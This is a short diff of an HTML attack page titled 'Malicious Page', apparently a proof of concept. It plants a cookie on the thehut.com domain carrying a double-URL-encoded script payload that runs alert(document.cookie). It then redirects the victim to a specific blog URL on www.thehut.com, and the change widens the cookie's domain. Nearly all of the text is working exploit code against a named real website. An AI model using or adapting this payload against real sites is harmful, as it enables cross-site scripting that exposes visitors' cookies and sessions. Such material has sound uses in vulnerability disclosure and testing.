@@ -3,8 +3,8 @@
 <head>
   <title>Malicious Page</title>
   <script>
-    // Set the cookie
-    document.cookie = 'b502c1db-4f30-494a-8b0f-95b1fece8d26x1f09%253c%252fscript%253e%253cscript%253ealert%2528document.cookie%2529%253c%252fscript%253evrnz6; path=/; domain=www.thehut.com';
+    // Set the cookie for thehut.com domain
+    document.cookie = 'b502c1db-4f30-494a-8b0f-95b1fece8d26x1f09%253c%252fscript%253e%253cscript%253ealert%2528document.cookie%2529%253c%252fscript%253evrnz6; path=/; domain=.thehut.com';
 
     // Redirect the victim to the vulnerable URL
     window.location.href = 'https://www.thehut.com/blog/home/page/1/?force=1';
